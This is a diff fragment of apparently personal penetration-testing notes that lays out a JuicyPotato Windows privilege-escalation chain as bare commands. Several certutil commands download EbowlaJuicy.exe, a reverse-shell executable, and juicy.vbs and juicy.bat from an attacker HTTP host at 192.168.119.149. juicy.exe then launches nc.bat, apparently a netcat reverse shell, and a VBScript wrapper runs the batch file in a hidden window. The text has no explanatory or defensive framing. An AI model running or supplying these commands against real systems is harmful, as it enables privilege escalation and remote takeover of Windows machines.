@@ -7,4 +7,26 @@ certutil -urlcache -split -f http://192.168.119.149/JuicyPotato/EbowlaJuicy.exe 
 
 certutil -urlcache -split -f http://192.168.119.149/reverseShell.exe exploit.exe
 
+cmd /c juicy.exe -l 1111 -p C:\Windows\Temp\test\nc.bat -t *
+
 cmd /c juicy.exe -l 1111 -p C:\Windows\Temp\test\exploit.exe -t *
+
+## On linux
+cat << EOF > juicy.vbs
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) & "C:\windows\temp\test\juicy.bat" & Chr(34), 0
+Set WshShell = Nothing
+EOF
+
+cat << EOF > juicy.bat
+C:\windows\temp\test\juicy.exe -l 5555 -p C:\Windows\Temp\test\nc.bat -t *
+EOF
+
+## On windows
+
+certutil -urlcache -split -f http://192.168.119.149/juicy.vbs
+
+certutil -urlcache -split -f http://192.168.119.149/juicy.bat
+
+cmd /c cscript juicy.vbs
+
